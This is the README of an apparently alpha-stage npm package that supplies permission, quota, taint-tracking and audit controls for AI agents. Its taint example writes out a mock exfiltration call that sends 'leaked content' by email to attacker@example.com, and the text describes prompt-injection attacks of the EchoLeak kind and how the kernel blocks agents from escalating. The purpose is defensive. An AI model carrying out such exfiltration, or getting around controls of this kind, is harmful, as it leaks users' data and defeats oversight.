# @kernel.chat/agent-os

**POSIX for AI agents.** Permissions, namespaces, resource quotas,
content-addressed audit, and downscoped handoff. The OS-level
substrate that runs above Modal-class sandboxes (Modal, Daytona,
RunPod, E2B, local Docker) and below MCP/A2A as the wire formats
agents speak to each other.

Apache 2.0. Node 22+. Status: `v0.2.0-alpha.0` — reference
implementation, not yet certified for multi-tenant production.

```bash
npm install @kernel.chat/agent-os
```

> **Two homes:** the canonical source is this package in the
> [`isaacsight/kernel`](https://github.com/isaacsight/kernel/tree/main/packages/agent-os)
> monorepo. A clean mirror auto-syncs to the standalone repo at
> [`isaacsight/agent-os`](https://github.com/isaacsight/agent-os) on every
> push, for focused discovery, topic-page presence, and clone-without-the-
> monorepo workflows. Open issues and PRs against the canonical monorepo.

---

## Why this exists

Anthropic ships *an* agent (Claude Code). Steinberger ships
substrates for *an* agent's automation (Peekaboo). Nobody has
shipped the OS that multiple agents share — the kernel/userspace
boundary, the permissions model, the resource accounting, the
audit-namespace isolation.

The 2025 EchoLeak vulnerability (CVE-2025-32711) and the ServiceNow
"confused deputy" pattern are the operational evidence the field
needs this. Multi-agent frameworks (AutoGen, CrewAI, LangGraph,
Swarm) treat "agent" as an application-layer abstraction over a
single trust domain. There's no syscall a malicious agent must
traverse.

This package is the syscall.

---

## The eight primitives

Synthesized from the May 2026 frontier research (`docs/frontier-2027-research.md`):

| # | Primitive | What it does | Status |
|---|---|---|---|
| 1 | `spawn(manifest)` | Fork an agent with declared identity, parent, and capability manifest. No implicit inheritance of parent tools. | ✓ shipped |
| 2 | `acap` | Signed, revocable capability tokens. `(subject, scope, ttl, max_invocations)` granted by the parent. | ✓ shipped |
| 3 | `ns` | Keyed namespace — memory, tools, audit-log view. Agents see only their namespace + mounted children. | ◐ typed; enforcement v0.2 |
| 4 | `ulimit-tok` | Per-agent token/$/wall-clock/spawn quotas. Hard kill on exceed; soft warn at threshold. | ✓ shipped |
| 5 | `chexec` | Trust-channel exec — every tool call tagged with `(caller_acap, payload_origin, taint_set)`. Tainted input cannot reach high-priv tools. | ✓ shipped |
| 6 | `audit` | Append-only, content-addressed event log per namespace. Uses `@kernel.chat/kbot-finance`'s hash-chained log. | ◐ uses kbot-finance; namespace isolation v0.2 |
| 7 | `handoff` | Task transfer with explicit capability downscoping. Receiver cannot escalate. | ✓ shipped (`downscope()`) |
| 8 | `snapshot` | Content-addressed agent state freeze. Same state → same `cid`. | — v0.2 |

Five primitives ship in v0.1; three are documented but partial. The
package is honest about which is which.

---

## Quick start

```ts
import { AgentRegistry, spawn, grant, verify, BudgetTracker } from '@kernel.chat/agent-os'
import { randomBytes } from 'node:crypto'

// 1. Create the registry (in v0.1 this is in-process; v0.2 splits it
//    out into a kernel daemon so multiple agent processes share it).
const registry = new AgentRegistry()

// 2. Spawn the root agent.
const rootKey = randomBytes(32)
const root = spawn(
  {
    parent: null,
    purpose: 'orchestrator',
    requested_capabilities: [],
    budget: {
      max_input_tokens: 1_000_000,
      max_output_tokens: 500_000,
      max_wall_clock_seconds: 3600,
      max_cost_usd: 50,
      max_children: 10,
    },
    namespace: {
      name: 'root',
      memory: [],
      tools: ['mcp_send', 'http_get', 'email_send'],
      audit_namespace: 'root:audit',
      mounts: [],
    },
  },
  { registry },
)
if (!root.ok) throw new Error(root.error.message)

// 3. Spawn a child for a specific task.
const child = spawn(
  {
    parent: root.value.manifest.id,
    purpose: 'fetch a single URL',
    requested_capabilities: [],
    budget: {
      max_input_tokens: 10_000,
      max_output_tokens: 5_000,
      max_wall_clock_seconds: 60,
      max_cost_usd: 0.5,
      max_children: 0,
    },
    namespace: {
      name: 'fetcher',
      memory: [],
      tools: ['http_get'],
      audit_namespace: 'root:fetcher:audit',
      mounts: [{ namespace: 'root:audit', mode: 'read' }],
    },
  },
  { registry },
)
if (!child.ok) throw new Error(child.error.message)

// 4. Grant the child a narrow, time-bounded capability.
const fetchCap = grant(
  {
    subject: { kind: 'tool', name: 'http_get' },
    scope: ['invoke'],
    max_invocations: 3,
    justification: 'fetch the SEC filing the user asked about',
  },
  {
    granted_by: root.value.manifest.id,
    granted_to: child.value.manifest.id,
    expires_at: new Date(Date.now() + 5 * 60_000).toISOString(),
    signing_key: rootKey,
  },
)

// 5. Verify the capability — the kernel does this before every tool call.
const trust = new Map([[root.value.manifest.id, rootKey]])
const check = verify(fetchCap, { trust })
if (!check.ok) {
  console.error('capability denied:', check.error)
} else {
  console.log('child may proceed with http_get')
}
```

---

## Taint tracking — chexec

Every tool call routes through a typed channel tagged with provenance.
Tainted inputs (fetched HTML, email body, untrusted file, message
from another agent) cannot reach high-privilege tools without an
explicit untaint by a sufficiently-trusted agent.

```ts
import { checkTaint, propagate, DEFAULT_TAINT_POLICY } from '@kernel.chat/agent-os'

// An email body is tainted at intake.
const emailTaint = {
  source: 'email' as const,
  origin: 'inbox/attacker@example.com',
  introduced_at: new Date().toISOString(),
}

// The agent later tries to send an email containing content from the inbox.
const exfilAttempt = {
  tool: 'email_send',
  args: { to: 'attacker@example.com', body: 'leaked content' },
  caller: 'agent_compromised' as any,
  acap: 'cap_email_send',
  taints: [emailTaint],
}

const result = checkTaint(exfilAttempt)
// → { ok: false, error: { code: 'taint_violation', ... } }
// The kernel refuses before the tool runs, regardless of what
// the model decides.
```

This is the kernel-level response to the EchoLeak class of LLM Scope
Violation vulnerabilities (CVE-2025-32711). The model doesn't have
to be perfectly aligned; tainted input is structurally prevented from
reaching exfil-capable tools.

---

## Downscoped handoff

When agent A passes a task to agent B, B's capabilities are
strictly subset of A's. The kernel rejects any attempt to escalate.

```ts
import { downscope } from '@kernel.chat/agent-os'

// Agent A has a capability with 10 invocations.
const aCap = grant(/* ... 10 invocations ... */)

// A wants to delegate to B with only 3 invocations.
const bCap = downscope(aCap, {
  granted_to: 'agent_b' as any,
  max_invocations: 3,
  signing_key: aKey,
})
// → ok, B has a narrower version.

// A tries to delegate to B with MORE invocations.
const bad = downscope(aCap, {
  granted_to: 'agent_b' as any,
  max_invocations: 100,
  signing_key: aKey,
})
// → { ok: false, error: { code: 'handoff_escalation_denied', ... } }
```

---

## Where this fits in the agent stack

```
┌──────────────────────────────────────────────────────────┐
│  Application: Claude Code, kbot, your-agent              │
└─────────────────────────┬────────────────────────────────┘
                          ▼
┌──────────────────────────────────────────────────────────┐
│  Protocol wire formats: MCP (agent ↔ tool), A2A          │
│                          (agent ↔ agent)                 │
└─────────────────────────┬────────────────────────────────┘
                          ▼
┌──────────────────────────────────────────────────────────┐
│  Agent OS: @kernel.chat/agent-os  ← THIS PACKAGE         │
│  permissions, namespaces, quotas, taint, handoff, audit  │
└─────────────────────────┬────────────────────────────────┘
                          ▼
┌──────────────────────────────────────────────────────────┐
│  Sandbox provider: Modal, Daytona, RunPod, E2B,          │
│                    local Docker, bare process            │
└──────────────────────────────────────────────────────────┘
```

The OS doesn't reinvent the sandbox; it's the contract between
agents that runs above the sandbox's isolation primitives.

---

## What's deliberately not in v0.1

- **Distributed kernel.** v0.1 is in-process. v0.2 splits the
  registry into a daemon so multiple agent processes can share the
  kernel.
- **Snapshot / restore.** Content-addressed agent state freeze.
  Useful for forking experimental branches; v0.2.
- **Namespace enforcement.** The types are there; the runtime
  enforcement of read-only mounts is v0.2.
- **Ed25519 signatures.** v0.1 uses HMAC-SHA256 for parity with
  kbot-finance's governance substrate. v0.2 upgrades.
- **Audit-log namespace isolation.** v0.1 routes audit through
  kbot-finance's hash-chained log directly; namespace-scoped views
  land in v0.2.

The package is intentionally honest about its `alpha.0` state.

---

## FAQ

### What is "POSIX for AI agents"?

POSIX standardized the OS-level interface that every Unix program could rely on: file descriptors, processes, signals, permissions, pipes. Before POSIX, every Unix variant had its own incompatible primitives. After POSIX, a program written against the standard ran anywhere.

agent-os is the equivalent move for AI agents. Today every agent framework (LangChain, AutoGen, CrewAI, kbot, Anthropic's harness) reinvents permissions, namespaces, quotas, and audit from scratch. agent-os defines those primitives once, in a substrate any agent platform can sit on top of.

### How does agent-os differ from MCP?

MCP (Model Context Protocol) standardizes how agents call **tools and resources**. agent-os standardizes the **OS layer underneath the agent itself** — what the agent is allowed to do, what it can see, how it's metered, and how its actions get audited.

The two are complementary. An agent runs on agent-os primitives (permissions, quotas, audit), then calls out to MCP servers for tools and data. MCP is the bus; agent-os is the kernel.

### What is taint tracking for AI agents?

Taint tracking marks data flowing into an agent with a provenance label, then refuses actions that would mix tainted data with untainted operations. Originally a Perl security pattern; adapted here for the agent threat model where prompt injection from untrusted sources (web pages, emails, documents) can override an agent's instructions.

In agent-os, `chexec` is the taint-aware exec primitive: every command an agent issues carries the taint set of its inputs. The kernel refuses any exec where a tainted input would be used in a sensitive operation (filesystem write outside the namespace, network request to an unfamiliar host, credential vault access). EchoLeak-class attacks become structurally hard rather than merely caught.

### What does `chexec` do?

`chexec` is the agent-OS analog of `execve` but with capability + taint enforcement. When an agent wants to run a command (shell, MCP tool call, internal function), it passes the request through `chexec`. The kernel:

1. Verifies the agent's signed capability token (`acap`) authorizes the operation
2. Walks the taint graph of the inputs
3. Checks the operation against the agent's namespace boundaries
4. Charges the operation against the agent's quota (`ulimit-tok`)
5. Records the operation in the content-addressed audit log
6. Executes if all checks pass; refuses with a reason code otherwise

The result is that every agent action is bounded, metered, and replayable. A malicious or buggy agent cannot escape its namespace or exceed its quota.

### Why "agent-OS" instead of "AI agent framework"?

A framework is a library you compose your agent against. An operating system is a substrate your agent runs on top of, without knowing it. The substrate distinction matters because (a) the substrate is portable across frameworks — your agent built on LangChain and your agent built on kbot can both run on agent-os without rewrite — and (b) the substrate is auditable at one place, not N places per framework.

The naming move ("POSIX for AI agents") makes the abstraction level explicit. We're not building another agent framework; we're building the layer those frameworks should all sit on.

### How does this relate to provenance engineering and orchestration engineering?

These are three of the six disciplines in the agentic engineering field map ([`docs/agentic-engineering.md`](../../docs/agentic-engineering.md)):

- **agent-OS** (this package): system primitives the agent runs on
- **Provenance engineering** ([`kbot-finance`](../kbot-finance/)): the substrate that makes actions provable and replayable
- **Orchestration engineering** ([`kbot-orchestrator`](../kbot-orchestrator/)): pipelines that route work between agents and humans

The three stack. agent-os provides the kernel primitives; provenance engineering provides the audit substrate the kernel writes through; orchestration engineering provides the pipeline layer that drives multi-agent outcomes through both.

---

## License

Apache 2.0. Built for the same open-core + commercial-premium shape
as `@kernel.chat/kbot-finance` — the OS itself stays free; commercial
offerings (multi-tenant kernel-as-a-service, certified hardware
backing, etc.) are downstream products.

---

## Acknowledgements

The eight primitives were synthesized from the May 2026 frontier
research, including the AIOS paper (Rutgers/Sky Lab, COLM 2025),
the Agent Operating Systems Blueprint preprint, the ASPLOS 2026
AgenticOS workshop call, Letta's MemGPT lineage, Google's A2A
protocol, and analysis of the EchoLeak class of vulnerabilities.

The package is positioned to be ahead of where Anthropic + Steinberger
are pushing today (cf. `docs/frontier-2027.md`). Not by competing on
their axes — by claiming the OS-level substrate slot that's still
genuinely open.
